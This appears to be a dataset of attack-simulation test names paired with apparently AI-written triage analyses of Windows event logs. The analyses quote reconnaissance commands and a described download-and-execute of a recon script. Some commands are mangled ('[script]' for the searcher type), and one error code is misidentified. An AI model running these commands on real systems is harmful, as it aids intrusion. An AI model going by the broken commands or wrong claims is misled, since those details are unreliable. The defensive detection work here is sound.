### Guidance on How to Proceed:
1. **Forensic Analysis**: Perform a detailed forensic investigation of the affected system, particularly focusing on the `admin_test` user activities.
2. **Containment**: Quarantine the affected system to prevent pivoting and lateral movement within the network.
3. **Credential Monitoring and Reset**: Investigate and monitor the accounts for any signs of compromise; consider resetting credentials for safety.
4. **Review Security Configurations**: Examine security policies related to PowerShell execution, privilege assignments, and NTLM authentication.
5. **Threat Hunting**: Use threat hunting techniques to find any indicators of compromise (IOCs) across the network.

Given the considerations, the logs should be categorized into the following resolution:

**Resolution: MALICIOUS** - The logs contain definitive signs of malicious activity, primarily based on the encoded PowerShell usage, suspicious script executions, and privilege escalations."
Enumerate Active Directory Computers with ADSISearcher,"Upon analysis of the provided logs, several key points and observations are identified:

1. **PowerShell Logs**: There is a PowerShell command executed with a script to query computer accounts in an Active Directory context. Specifically, the command line `powershell.exe & {([script]""objectcategory=computer"").FindAll(); ([script]""objectcategory=computer"").FindOne()}` is mentioned repeatedly. While PowerShell is a common administrative tool, executing scripts that enumerate computer objects can be an indicator of reconnaissance activity, associated with lateral movement or privilege escalation attempts within a network. However, the context in which these scripts were executed is crucial to determining whether they were benign administration tasks or part of a malicious campaign.

2. **Sysmon Logs**: 
   - Multiple instances of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` were executed by the user `SERVER002\admin_test`. While such executions can be part of routine administration, they could also be used for gathering information or configuring the system by adversaries in an attack chain. Notably, `powershell.exe` is also involved, reinforcing the potential for reconnaissance or command execution.
   - Utilization of `WmiPrvSE.exe` (WMI Provider Host) is noted, which could potentially indicate remote management or data gathering, often used in lateral movement during an attack.
   - High integrity levels associated with these processes indicate they were run with elevated privileges, which could be part of normal administrative behavior, but can also serve as an indicator of a potential compromise if executed without proper justification.

3. **Security Logs**: The consistent event ID 5379 with return code 3221226021 suggests unsuccessful credential access attempts using various types like MicrosoftAccount and WindowsLive tokens. These could indicate an attempt to access stored credentials or tokens in the system, which usually aligns with malicious intent unless verified for legitimate service activity.

4. **System and Application Logs**: 
   - Events associated with Windows Update (KB2267602 for Microsoft Defender Antivirus) indicate typical system maintenance behavior.
   - Presence of Windows Defender with a security product state as ""on"" indicates that basic endpoint protections were active.

**Assessment and Resolution**:
Considering the logs, the repeated and possibly automated querying of objects in the domain using PowerShell, along with several instances of command executions and attempts to access credentials, forms a pattern that aligns with tactics often employed in reconnaissance and further stages of an attack.

- **Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct further investigation to verify the legitimacy of PowerShell activity. Check for administrative actions that might require these executions or indicators of scripting attacks such as fileless malware.
- Examine EDR/AV logs to determine if there are any correlation alerts related to lateral movement or privilege escalation attempts.
- Review user activity logs and authentication attempts to ensure accounts have not been compromised.
- Harden PowerShell usage through script block logging and restricting execution policies on critical systems like the CEO's machine.
- Ensure that all PowerShell scripts and their sources are scrutinized, and unauthorized scripts are blocked.
- Continue monitoring for abnormal activities and assess network traffic for unexpected patterns that could indicate further malicious behavior. 

These steps can confirm or refute potential compromises, reducing the risk of lateral movement or exfiltration associated with suspicious activities."
WinPwn - GeneralRecon,"The analysis of the provided Windows event logs reveals both benign and potentially malicious activity, as detailed below:

1. **Benign Activities:**
   - The logs show several legitimate processes such as `MicrosoftEdgeUpdate.exe`, `TiWorker.exe`, and `sppsvc.exe`, which are related to system and application updates on the Windows operating system. These processes are run by `NT AUTHORITY\SYSTEM` or `NT AUTHORITY\NETWORK SERVICE`, indicating they have system-level permission to perform updates and service installations.
   - The `whoami.exe` and `hostname.exe` executions are normal and typically used for system diagnostics or in scripts to check the current user or hostname of the system, respectively. The context doesn't suggest malicious intent.

2. **Suspicious Activities:**
   - There are several executions of `wevtutil.exe` by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate system utility used for managing event logs, multiple rapid executions might suggest attempts to query or clear event logs to hide traces of other activities.
   - The `powershell.exe` invocation includes downloading and executing a script from an external non-official repository (`https://raw.githubusercontent.com/script/.../script.ps1`). This behavior is particularly suspicious because:
     - It involves using PowerShell to download and execute a script from the internet, which can often be indicative of malicious activity.
     - The script contains functions for ""Generalrecon"", suggesting reconnaissance activities, a common initial phase in cyber attack methodologies.

**Assessment:**
The activity involving PowerShell script execution from a potentially untrusted source and multiple instances of `wevtutil.exe` execution by `admin_test` are concerning and suggest possible malicious reconnaissance or preparation activities. These warrant further investigation to ascertain the nature and intent of these actions.

**Recommended Actions:**
- Conduct a thorough investigation of the script downloaded from `https://raw.githubusercontent.com` to understand its full functionality and potential malicious intent.
- Review the logs associated with `wevtutil.exe` to determine if there’s evidence of log tampering.
- Verify the legitimacy of the user `admin_test` and their activity during the log times mentioned, possibly interviewing the account owner if appropriate.
- Monitor network activity for any other anomalous or suspicious behavior.
- Consider applying threat detection rules to track similar PowerShell activities and `wevtutil.exe` executions in the future.

**Resolution:**
Based on the evidence, the final resolution is **MALICIOUS** due to the suspicious PowerShell activity connected to an external script download and execution, indicating potential compromise.

Permission Groups Discovery PowerShell (Domain),"### Detailed Analysis of Provided Windows Event Logs

Based on a detailed analysis of the provided event logs, here are the key observations and findings:

#### Suspicious or Anomalous Behavior:
1. **Frequent Execution of Whoami and Hostname**:
   - The `whoami.exe` and `hostname.exe` commands are executed multiple times. While their executions are legitimate, frequent invocation without obvious necessity can be indicative of script-based attack behaviors or malicious actor reconnaissance processes.

2. **Abundant Use of Command Line Tools**:
   - The consistent and repeated use of system executables like `conhost.exe`, and utility commands like `wevtutil.exe`, exhibits patterns typical in misconfigurations or scripts that might be leveraged for attacks. `wevtutil.exe` is used to manage event logs, and while legitimate, continuous use could indicate attempts to manipulate logs.

3. **PowerShell Execution**:
   - The usage of PowerShell observed in the logs, with the command executed as `powershell.exe & {get-ADPrincipalGroupMembership $env:USERNAME | select name}`, is relatively normal for an administrative task but warrants attention due to its potential for misuse, especially as it may be used to gather domain group membership information which might be used in later stages of an attack.

4. **High Integrity Level Processes**:
   - Multiple processes are running with a high integrity level executed by the user `SERVER002\admin_test`. This should be examined for unintentional privilege elevation or exploitation since high integrity allows more access.

5. **Microsoft Edge Update Executions**:
   - There are numerous executions of `MicrosoftEdgeUpdate.exe` and related installations or updates occurring in quick succession. While this may represent legitimate software updates, the extent and immediate repetition of these processes may highlight misconfiguration, automation loops, or even malware disguised as update executables.

6. **Absence of Security Log Data**:
   - There is no security log provided, which limits insight into user logins, failed login attempts, or changes to audit policies that could further substantiate particular concerns.

#### Potentially Malicious Activity:
- **PowerShell and Reconnaissance Commands**:
  The use of PowerShell to retrieve group memberships can be malicious if conducted outside of expected administrative activities. The potential, coupled with the fact that more mundane reconnaissance tools (e.g., whoami, hostname) are executed repeatedly, provides a ground for concern about an automated script running for investigation or exploitation.

- **Registry/Critical Modifications**:
  The repeated call of `wevtutil` processes could be an attempt to alter or clear event logs, concealing malicious activities — a common technique leveraged in textbook attack scenarios.

#### Threats or Risks Identified:
- **Reconnaissance**: Execution patterns suggest that an actor could be conducting reconnaissance inside the network environment.
- **Persisting Executions**: Repetitive legitimate process execution patterns could help in extracting sensitive information or preparing an environment for a more comprehensive exploit or data exfiltration.
- **Privileged Process Abuse**: High integrity level execution needs verification to identify whether expected or exploited.

#### Guidance:
- **Log Evaluation**: Review scheduled tasks or automated scripts on `Server002` that may explain the frequent execution of system commands.
- **User Access Review**: Verify `admin_test` account activities, especially in the context of processes initiated from this account.
- **Security Policies**: Enhance audit policy to ensure better visibility and protection against privilege misuse and unauthorized access.
- **Edge Update Monitoring**: Validate the legitimacy of the Edge update processes; if suspicious, investigate the integrity and sources of these update files.

Extract chrome Browsing History,"Upon reviewing the provided Windows event logs, several aspects of the events can be analyzed for potential security incidents. Here is the assessment of key events:

1. **Process Execution & Privileges**:
   - A majority of the entries involve processes like `MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, `conhost.exe`, and PowerShell scripts executed by `SERVER002\\admin_test` and `NT AUTHORITY\\SYSTEM`. Processes running under `NT AUTHORITY\\SYSTEM` have high privilege and therefore could be concerning if associated with unexpected tasks.
   - Entries involving `MicrosoftEdgeUpdate.exe` suggest legitimate activities related to Microsoft Edge browser updates. There are multiple executions of Edge update components, which suggests automated or scheduled update tasks occurring as might be expected.
   - The use of `wevtutil.exe` and `conhost.exe` by an administrative user `SERVER002\\admin_test` is quite normal if it correlates with system management or log querying activities.

2. **PowerShell Activity**:
   - There is a PowerShell script (`powershell.exe & {$Username = (whoami)...}`) execution logged. This script appears to be extracting browsing history from Google Chrome and saving it to a file. Such behavior could be legitimate if performed by the security department or an IT audit for security purposes. However, this behavior can raise suspicion if not authorized, as it involves potentially sensitive data extraction.

3. **Whitelisting/Benign Activity**:
   - The logs contain multiple entries related to normal system operations such as the running of standard Windows processes (e.g., `svchost.exe`, `SearchProtocolHost.exe`) under the correct SYSTEM or LOCAL SERVICE users.
   - Time synchronization details and Edge update service stopping (`Service stopped`) in the Application log do not present direct evidence of malicious activity on their own.

4. **Security Logs**:
   - The security logs primarily consist of time change events, which can occur during normal updates or system adjustments.

**Assessment**:
- The running of Edge update processes and the command-line parameters used suggest typical update operations, posing no evident threat.
- The PowerShell activity around data extraction requires further verification: Was it an authorized activity from the security or IT departments, or could it be indicative of potential unauthorized data gathering? This remains the main concern from the logs provided.

**Resolution: SUSPICIOUS**:
- Due to potentially unauthorized PowerShell script execution extracting Chrome history, which could imply data exfiltration intentions, further investigation is warranted. Verify users authorized to run such scripts and confirm any scheduled or requested audits.
- Recommendations include verifying permissions, auditing user activities and authorization related to data access, and reviewing job schedules or prior instructions for similar tasks.
  
How you proceed:
- Confirm if this was an administrative script scheduled for routine checks or an unauthorized one.
- Collaborate with IT and security teams to review access logs, ensure endpoint protections are intact, and potentially adjust permissions if needed.
- Review organizational policy compliance regarding the use of PowerShell for data extraction tasks."
AWS - EC2 Security Group Enumeration,"Upon reviewing the logs, here are the key observations regarding potentially suspicious or malicious activity:

1. **Command Line Process Execution:**
   - The execution of `""cmd.exe"" /c aws ec2 describe-security-groups --profile default --output json` stands out as potentially suspicious. This command indicates interaction with AWS services using the AWS CLI. The usage of external cloud service commands might be a routine administrative task; however, if unexpected, it might indicate an escalation of privileges or data exfiltration attempt.

2. **Elevation of Privileges:**
   - Many processes are executing at a high integrity level, indicating administrative or elevated privileges (e.g., `cmd.exe`, `whoami.exe`, `HOSTNAME.EXE`). While not inherently suspicious by itself, in combination with unusual command execution, this could point to inappropriate privilege use or an intrusion.

3. **Frequent Use of Administrative Tools:**
   - There are numerous entries for processes like `wevtutil.exe` and `conhost.exe`, indicating multiple administrative or system-related operations. While this could be part of regular administrative tasks, the high frequency suggests the need for further validation, especially in the context of potential lateral movement within networks.

4. **Time Stamping and Synchronization Events:**
   - Events related to time synchronization (EventID: 4616) don't appear particularly suspicious. They indicate normal automated time adjustments on the system (via `svchost.exe`), typical in many environments.

5. **Edge Update Processes:**
   - Multiple entries for `MicrosoftEdgeUpdate.exe` are present. These are associated with updating Microsoft Edge and look like normal update processes. However, they are leveraging processes like `svchost.exe`, `sppsvc.exe`, and involve high privilege levels, which could be used in exploitation chains. This should be cross-referenced against the expected behavior for this update service on the host.

Based on the above observations, my assessment is:
- **SUSPICIOUS:** The presence of cloud interaction through commands such as `aws ec2 describe-security-groups`, especially involving high privileges, warrants further investigation. Additionally, validating the frequency and context of the `wevtutil.exe` and `conhost.exe` executions to rule out misuse is prudent. Finally, check whether the Microsoft Edge update processes align with corporate policy and patching cycles.

**Guidance on How to Proceed:**
- Conduct a full investigation into the AWS CLI command executions to understand the user context and rationale behind this action.
- Verify the Integrity level and execution context of processes like `wevtutil.exe` to ensure they were executed by legitimate users and not masked under scripted operations or malicious payloads.

Check computer location,"### Analysis of the Logs

#### Security Logs Analysis:
- The security logs indicate an event where the system time was changed by the ""svchost.exe"" process. This is an Event ID 4616 which in itself is not inherently malicious but can be utilized by attackers to alter timestamps in logs for misdirection.

#### Sysmon Logs Analysis:
- Multiple entries for process creations are logged by Sysmon. Key observations include:
  - Use of legitimate system binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` by the user `SERVER002\admin_test`. These actions could suggest administrative activity, possibly scripting or maintenance tasks, due to the numerous executions within seconds.
  - Execution of `cmd.exe` to perform registry queries appears somewhat unusual for routine administrative activities, particularly querying `HKEY_CURRENT_USER\Control Panel\International\Geo`. This type of activity could be an indicator of process execution monitoring, a sign of discovery or reconnaissance actions.
  - Numerous Microsoft Edge Update related processes are present, likely indicating the software is updating or verifying its status. Activities are performed by `NT AUTHORITY\SYSTEM`, which is typical for such services but may require verification that it aligns with update schedules and that no external tampering has occurred.
  
#### Application Logs:
- The Application log mentions the Software Protection Platform Service (SPP) event correlating with the Sysmon entries related to the `sppsvc.exe` process operating normally without warnings or errors.
- Events from `edgeupdate` indicate that the services stopped, corroborating with the processes related to Microsoft Edge update seen in Sysmon logs.

### Assessment:
- **Anomalous Behavior:**
  - The frequent execution of `cmd.exe` along with registry query actions might be considered unusual if this is not a regular administrative task. Such commands can be present during initial access or info gathering stages of an intrusion.
  - Frequent processes involving Microsoft programs like Edge Update could be ordinary, but ensure they align with approved update timing.

- **Indicators of Malicious Activity:**
  - System time changes can be part of obfuscation tactics if matched with unexpected or unauthorized activities around the time of change.
  - Without specific context on the necessity for the various wevtutil and cmd executions for routine operations, these could potentially be indicative of an attempt to cover tracks or system reconnaissance by the `admin_test` account.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - While no direct evidence of compromised data or privilege escalation is visible, the combination of system time changes and registry querying via command line elevate the need for further investigation. 
  - Verifying the legitimacy of the `cmd.exe` commands and `admin_test` account's activities, cross-referencing with known maintenance events, and reviewing Edge Update configurations and frequencies are recommended to rule out possible security incidents."
System Time Discovery,"To analyze the provided Windows event logs, let's review the key entries across different logs:

1. **System Log:**
    - The logs indicate a typical behavior involving time synchronization and other standard services. No evidence here directly points towards any anomalies or suspicious behavior. The svchost.exe modifications are consistent with legitimate system processes managing time synchronization.

2. **Application Log:**
    - Events related to ""Microsoft-Windows-Security-SPP"" and ""edgeupdate"" are seen. The edgeupdate service stopping and starting could imply scheduled updates, which align with routine activities. The Software Protection Platform Service (SPP) entry also seems routine and expected.

3. **Security Log:**
    - The Security Event IDs `4616` pertain to time change events, which match with the observed time synchronization in the System logs. Nothing within these indicates malicious activity.

4. **Sysmon Log:**
    - A series of command executions are seen, primarily involving whoami.exe, cmd.exe, net.exe, net1.exe, and w32tm.exe. Additionally, Microsoft Edge Update activities were logged, which appear consistent with an automatic update process.
    - The use of whoami.exe, net.exe, along with time synchronization commands (`cmd.exe /c net time \\localhost & w32tm /tz`) implies some user-initiated or system-scheduled tasks. Running `whoami` might be to check active user privileges, a common legitimate action during diagnostics or scripting.
    - EdgeUpdate processes, exploring SHA256 hashes listed, align with Microsoft's edge update operations. Given this sequence is executed by the SYSTEM user, it is indicative of system-level services running with high privileges, a standard behavior for such updates.

5. **Overall Patterns:**
   - The logs reveal extensive software update activity related to Microsoft Edge within a short time frame, such as multiple instances of MicrosoftEdgeUpdate.exe and accompanying executables.
   - There's nothing indicative of privilege escalation, persistence, or uncommon process execution that would typically signify a compromise.
   - The use of utilities like whoami.exe, net, and time synchronization tools generally serves legitimate administrative purposes. These might need further scrutiny in certain contexts, but lacking other suspicious patterns here suggests they're likely benign.

### Resolution:
Based on the analysis, the log entries do not display clear indicators of compromise. The activities align with typical system maintenance or administrative tasks and software updates, specifically related to Microsoft Edge.

The final resolution is **BENIGN**. The logged activities are consistent with regular system and update operations. No further action or investigation is warranted based on the reviewed logs. However, continuous monitoring is advised, as any shifts from these normal patterns without user initiation could warrant attention."
Enumerate Active Directory Groups with ADSISearcher,"### Detailed Analysis of the Logs

Upon reviewing the provided Sysmon, Security, Application, System, and Windows PowerShell logs, I have identified several points of interest that could suggest malicious activities or warrant further investigation:

1. **Frequent Execution of System Utilities:**
   - Multiple executions of system utilities such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe` were recorded. While these could be benign, such commands are frequently used for reconnaissance during a compromise.
   - The activity mainly involves the user `SERVER002\admin_test` executing these utilities from a high-integrity level.

2. **PowerShell Activity:**
   - A PowerShell script was executed that appears to enumerate group objects: `""powershell.exe"" & {([script]\""\""objectcategory=group\""\"").FindAll(); ([script]\""\""objectcategory=group\""\"").FindOne()}""`.
   - This command could signify attempts at gathering information about user groups, which might be part of an enumeration step in a penetration test or attack.

3. **Event Time Manipulation:**
   - Notably, a discrepancy was identified in the time logs (`EventID: 4616` and `EventID: 1` in the System log), showing time adjustments backward to `2024-10-23 13:40:55.1533379` from `2024-10-23 13:40:58.6471848`.
   - The process executing this change was `svchost.exe`, a legitimate Windows process, but often mimicked by malware for stealth.

### Assessment of the Situation
- **Frequent Execution of Reconnaissance Commands:**
  - `hostname.exe`, `whoami.exe`, `wevtutil.exe` commands executed frequently in short intervals without an obvious legitimate pattern can be indicative of a script or attacker performing reconnaissance.

- **PowerShell Usage with a Suspicious Command:**
  - The use of PowerShell to query group objects can be indicative of potential privilege escalation or gaining deeper access insights. PowerShell is a common tool leveraged for its power and flexibility in legitimate and malicious operations.

- **Potential Time-Manipulation:**
  - Backdating or manipulating logs is a known tactic for attackers to cover tracks. However, the manipulation seems systemic and could suggest misconfiguration or benign service activity.

### Recommendation and Resolution
Given the evidence in the logs, my evaluation leads to categorize this as ""SUSPICIOUS"" due to:
- The unusual recursion of system commands typical of reconnaissance.
- PowerShell scripts pointing to potential enumeration tasks.
- System clock or event time adjustments that could be indicative of obfuscation activities.

### Guidance
- **Further Investigation:**
  - Verify the necessity and origin of these utilities' execution. Checking with the user or any automated tasks scheduled would help ascertain the intent.
  - Review the script contents, verify its legitimacy, and authenticate its implementation with the responsible department.
  
- **Containment and Monitoring:**
  - Implement tighter monitoring on similar activities, particularly around the `admin_test` account and executed processes.
  - Consider setting up alerts for PowerShell commands indicative of reconnaissance or enumeration activity.

- **Patch and Update:**
  - Ensure the system, including all installed applications, is fully patched and up-to-date to prevent known vulnerabilities from being exploited.

Concluding this analysis, additional scrutiny of the actions performed around these logs is advised to eliminate or confirm the threat's presence. The current evidence stops short of conclusively pointing to malicious activity but aligns with potentially harmful behaviors typically associated with intrusions."
Enumerate Active Directory Groups with Get-AdGroup,"### Analysis of Windows Event Logs

**1. PowerShell Activity:**
   - There are multiple PowerShell sessions invoked with the command `{Get-AdGroup -Filter *}`. The `Get-AdGroup` command is typically used to retrieve Active Directory groups and their properties. 
   - The logs don't specify any anomalous command-line arguments or scripts that suggest obfuscation, downloading, or executing of files which are typical indicators of malicious use of PowerShell.

**2. Privilege and Process Execution Monitoring (Sysmon Logs):**
   - Frequent execution of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` by `admin_test` seem normal for administrative operations. 
   - `wevtutil.exe` is commonly used for exporting logs or querying event logs, and the presence of `hostname.exe` and `whoami.exe` could indicate script-use to verify system details.
   - `powershell.exe` triggered under `admin_test` shows only `Get-AdGroup` usage which aligns with administrative checks.

**3. Security Log Analysis:**
   - Multiple login events (4624 - Logon and 4634 - Logoff) for the user `admin_test` showing privilege assignments including `SeDebugPrivilege` and other high-level system rights are noted. As the account is likely an administrative account, this isn't inherently malicious, but proper verification of the user activity and source (IPv6: fe80::e3b5:5371:12a8:9c77) is recommended to confirm legitimacy.

**4. System Time Alteration Events:**
   - The recurrence of EventID 4616 suggests that the system time was altered multiple times. This could indicate some form of system manipulation possibly aimed at evading time-based logs or anomalies. However, it's also possible under benign conditions like daylight saving changes or incorrect time synchronization settings.
   
**5. Edge Update Processes:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` running seem to reflect a Microsoft Edge automated update process, which involves multiple subprocesses likely due to the update mechanism.

### Assessment of the Situation

- **Anomalous Behavior:** Time changes and PowerShell command execution on a critical system should be closely monitored, but these instances alone don't unequivocally indicate malicious intent without corroborating malicious indicators like suspicious network connections or file alterations.
- **Potential Risks:** Privileges associated with `admin_test` and time change events warrant further investigation to rule out privilege misuse or potential tampering.
  
### Guidance:

- **Proceed with further investigative procedures** to verify the legitimacy of `admin_test's` activities and confirm the proper configuration and sync settings for the system time.
  
### Resolution:

- **Resolution:** Based on available events, the situation is marked as **SUSPICIOUS** due to system time adjustments and unnecessary logging in/out activities. Further investigation is needed.

In conclusion, without evident malicious activity in the logs, deeper investigation into session attributes and time settings is recommended to clear any doubts regarding potential exploitation or misconfigurations."
Remote Desktop Services Discovery via PowerShell,"Upon analysis of the given logs, here's a detailed assessment:

### System Log:
- **Suspicious Time Change Event**: There are multiple events reflecting a time change on the device:
  - Event ID 1 from Kernel-General shows inconsistent time changes. The old time ""2024-10-22 14:51:49.8568106"" was altered to ""2024-10-22 14:51:21.1723560"", which indicates a backdating of the system time. This is often done by attackers to hide traces or bypass time-sensitive security mechanisms.

### Sysmon Log:
- **Process Creation with High Privileges**: 
  - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by `SERVER002\admin_test`. `wevtutil.exe` is associated with event log management, and frequent execution could indicate log tampering attempts.
  - `powershell.exe` is executed running commands related to services management: `Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""`. The use of PowerShell for querying or manipulating services may signal unauthorized attempts to alter system configurations, particularly related to Remote Desktop Services.
  - There is a series of executions of system utilities like `hostname.exe` and `whoami.exe`, typically used for reconnaissance or environmental awareness by intruders.

### Windows PowerShell Log:
- **Remote Desktop Services Interaction**:
  - The PowerShell command captured indicates querying for Remote Desktop Services status. Coupled with the fact that this happened during a time alteration incident, it can suggest unauthorized investigation or attempts to enable/alter remote access settings.
  
### Security Log:
- **Logon Events and Privilege Escalation**:
  - `admin_test` account is seen logging in and getting elevated privileges (Event ID 4672) immediately following the time change. Elevated privileges suggest actions requiring high-level access, and if done nefariously, could lead to system compromise.

### Application Log:
- Routine entries with no direct indication of malicious activity were observed here related to the Software Protection Platform Service.

### Assessment & Resolution:
- **Overall Assessment**:
  - The combination of suspicious time changes, repeated executions of system utilities by `admin_test`, elevated privileges, and the querying of Remote Desktop Services create a profile of potentially malicious activity. These patterns align with typical steps an attacker might perform: gaining access, elevating privileges, covering tracks, and preparing for further compromise.

- **Resolution**: **SUSPICIOUS**
  - The activities have signs of potential malicious intent but do not definitively confirm a compromise. It requires further investigation by:
    - Verifying recent authorized changes or administrative activities linked to the `admin_test` account.
    - Conducting a thorough review of system and network access logs, correlating with any suspicious external connections, especially during the time change.
    - Inspecting other systems for similar patterns as a precaution.
    - Performing malware scans to detect any latent threats.
    - If unauthorized, resetting credentials and monitoring systems for aberrant behavior post-reset.

This situation requires further inquiries to validate or mitigate any potential risks anchored to these findings."
Port Scan using python,"### Detailed Analysis of the Logs

#### Windows PowerShell Log Analysis

1. **Event ID 403 and 600**: 
   - **Download and Execution**: Powershell is used to download a file (`python-3.10.4-amd64.exe`) from an external URL (`https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe`) and execute it with `/quiet` flag, suggesting a silent install. This can represent a legitimate operation, given the URL is a trusted source, but executing downloaded files silently should always be treated with caution unless verified.
   - **Command Execution**: Execution of a potentially custom Python script (`data.py`) with embedded IP (`127.0.0.1`) by PowerShell is noted. This could indicate local testing, but the origin and purpose of `data.py` remain unclear.

#### Security Log Analysis

1. **Event ID 4798**: 
   - **Group Membership Enumeration**: Several accounts including ""Guest,"" ""Administrator,"" and custom-named accounts like ""admin_test"" and ""lplui"" are enumerated. This activity, carried out by `CompatTelRunner.exe`, can be benign if related to system diagnostics, but unusual and requires verifying the purpose.

2. **Event ID 4672**: 
   - **Assignment of Special Privileges**: Indicates the assignment of sensitive privileges to SYSTEM, which requires verification to ensure it aligns with expected behaviors such as system updates or diagnostics.

#### System Log Analysis

- **Windows Update Events**: System logs indicate routine updates being processed. These activities seem legitimate and are expected as part of system maintenance.

#### Sysmon Log Analysis

1. **Process Creation and Execution**:
   - **Python Installation**: Execution trace confirms Python installer execution with the path typically associated with temporary or staged installations.
   - **Potential Scripting**: There is a command execution sequence involving `python.exe` and `data.py` which correlates with PowerShell's earlier script execution.
   - **Process Relationships**: Notably, several processes like `whoami.exe`, `hostname.exe`, and `CompatTelRunner.exe` appear in conjunction with administrative level user `admin_test`. While commands like `whoami` are frequently used in normal system checks, their appearance en masse around the investigation’s timeline necessitates validation.

2. **CompatTelRunner.exe Activity**:
   - **Observed child-parent process relationships**: CompatTelRunner is typically a telemetry service, but unusual if involved with enumerating accounts or unexpected tasks.

### Assessment and Guidance

- **Suspicious Activity Detected**: Although the command to download and quietly install Python is from a legitimate website, and Windows update activities seem routine, the silent execution and enumeration of group memberships by `CompatTelRunner.exe` alongside the presence of custom scripts (like `data.py`) indicate abnormal behavior.
  
- **Next Steps**:
  1. **Verify the origin and purpose of `data.py`** and its placement/location. Ensure it’s an authorized script.
  2. **Confirm legitimacy** of the Python installation and its necessity on the system, as well as ensure it aligns with organizational policy.
  3. **Review system firewall and egress policies** to confirm they align with expected operations.
  4. **Compare current behavior against baselines** to assess deviations in account usage and script execution.

### Resolution

- **Resolution: SUSPICIOUS**

The logs exhibit behavior that could be indicative of unauthorized operations or preparations for potential further compromise. Verification and investigation are needed to rule out or confirm malicious activity."
Windows Internal Packet Capture,"Upon reviewing the provided Windows event logs for Server002, the following observations and analyses have been made:

### Observations:

1. **Command Execution**:
   - Multiple instances of `wevtutil.exe` and `cmd.exe` executing commands were observed, notably:
     - `wevtutil.exe` was repeatedly executed by the user `SERVER002\admin_test` to interact with the event logs, which is a legitimate utility but could be suspicious if executed frequently or unexpectedly.
     - `cmd.exe` was executed with a command starting a network trace (`netsh trace start capture=yes tracefile=%%temp%%\trace.etl maxsize=10`). This command could be used for network diagnostics or troubleshooting, but it might also indicate activity aiming to capture network traffic for unauthorized purposes.

2. **Process and Execution Patterns**:
   - Several Windows utilities like `hostname.exe` and `whoami.exe` were executed. These utilities typically are used for system information gathering.
   - `conhost.exe` is launched alongside many of these processes which is normal for command-line operations.

3. **Privilege Escalation Indicators**:
   - Event ID 4672 logged special privileges being assigned (like `SeDebugPrivilege`) which could be indicative of high-level access activities, possibly for legitimate administrative tasks but also for privilege escalation.

4. **Time Change Event**:
   - The system time was adjusted, as indicated by Event ID 4616 in the Security log and Event ID 1 in the System log. It could have been changed for time synchronization purposes or can potentially indicate an attempt to cover tracks by modifying timestamps.

5. **Network Service Activity**:
   - `svchost.exe` associated with service host processes was observed running, which is typical for various essential Windows services.

### Assessment:

The combination of activities observed, such as the execution of several built-in utilities (`wevtutil.exe`, `cmd.exe/netsh`, `hostname.exe`, `whoami.exe`), privilege escalations log (Event ID 4672), and unusual time change events, suggests that there are activities that merit further investigation. Each action alone could be benign or part of routine administrative tasks; however, collectively they may be indicative of suspicious behavior that could be associated with either a legitimate power user or an adversary engaging in reconnaissance and establishing persistence.

### Resolution:

**Resolution: SUSPICIOUS**

### Guidance:

1. **Investigate User Activity**: Verify the legitimacy of activities performed by the user `SERVER002\admin_test`. Determine if the actions were expected or authorized by contacting involved personnel or reviewing related change requests.

2. **Review Network Setup**: Follow up on the initiation of the network trace command to confirm if it was part of an authorized diagnostic procedure.

3. **Audit Privilege Assignments**: Examine why high-level privileges were necessitated and if they align with expected administrative tasks.

4. **Scrutinize Time Changes**: Investigate the reasons and authorizations for modifying system time settings.

5. **Monitor for Future Activities**: Implement or enhance monitoring for further signs of reconnaissance, lateral movement, or unauthorized data exfiltration.

In conclusion, the resolution of ""SUSPICIOUS"" indicates that while no explicit malicious activity was identified, the pattern of events and their potential implications require investigation to rule out any security risks."
List Process Main Windows - C# .NET,"Upon reviewing the logs provided, here are the key observations and analysis:

1. **Security Log Events (EventID 5379)**: These events indicate unsuccessful credential validation attempts for a Microsoft account and WindowsLive tokens. The ReturnCode `3221226021` corresponds to a ""STATUS_NO_LOGON_SERVERS"" error, which means the credential validation was unsuccessful. This could imply an attempt to authenticate without having the necessary validation server accessible, but without other related malicious actions, it might simply be indicative of network issues rather than an outright suspicious activity.

2. **System Log Events**: These include typical updates and operations performed by Windows components. The logs in this section, such as Windows Update client logs for Microsoft Defender Antivirus updates, are completely normal and expected in a typical operation scenario.

3. **Sysmon Log Events**: 
   - Frequent execution of `wevtutil.exe`: It initializes multiple times, indicating potential event log reading or exporting, possibly indicative of log tampering, especially if it aligns with abnormal behavior or timelines.
   - Repeated use of `powershell.exe`, `conhost.exe`, and `wevtutil.exe`: These applications are often associated with system updates or legitimate administrative tasks. However, their frequent and concurrent use, especially when tied closely to potentially anomalous activities, can suggest efforts to mask actions or log analysis attempts.
   - Commands involving compilation (`csc.exe`) and execution from the temp directory: The command-line activity involving `cmd.exe` and `csc.exe` to compile and run a C# script from the `%TEMP%` directory could potentially indicate off-the-cuff script execution or malware that uses temporary execution from script files. The actions to compile a `.cs` file (C# source file) and execute it are particularly noteworthy given the context and timing but without more direct context from the logs, this remains out of the ordinary.
   - Command execution involving `whoami.exe` and `hostname.exe` suggests checking the current user and machine environment, which can be anomalous if unnecessary and unscheduled.
   
4. **Event Context and Frequency**: The frequency and pattern of the events, along with the utilization of scripting and system tools in quick succession, merit further investigation to rule out scripts or routines executed as part of an ongoing threat.

**Assessment**: Given the absence of context indicating authorized administrative tasks, the mix of credential validation errors, and the suspicious sequence of logged administrative actions (like compiling and executing scripts in the temp directory), this behavior aligns with potentially unauthorized use or reconnaissance.

**Resolution**: **SUSPICIOUS**

**Recommendation**: 
- Investigate the origin and legitimacy of the compiled C# script and how it ties into this machine's operational scope.
- Review administrative access logs to determine if these activities align with legitimate administrative tasks.
- Conduct a thorough scan for unauthorized scripts and tools in the temp directories to identify and mitigate potential threats.
- Monitor for repeated, unusual log cleaning or exporting activities that may suggest efforts to obfuscate further malicious behavior."
Powershell enumerate domains and forests,"## Detailed Analysis

### Security Log
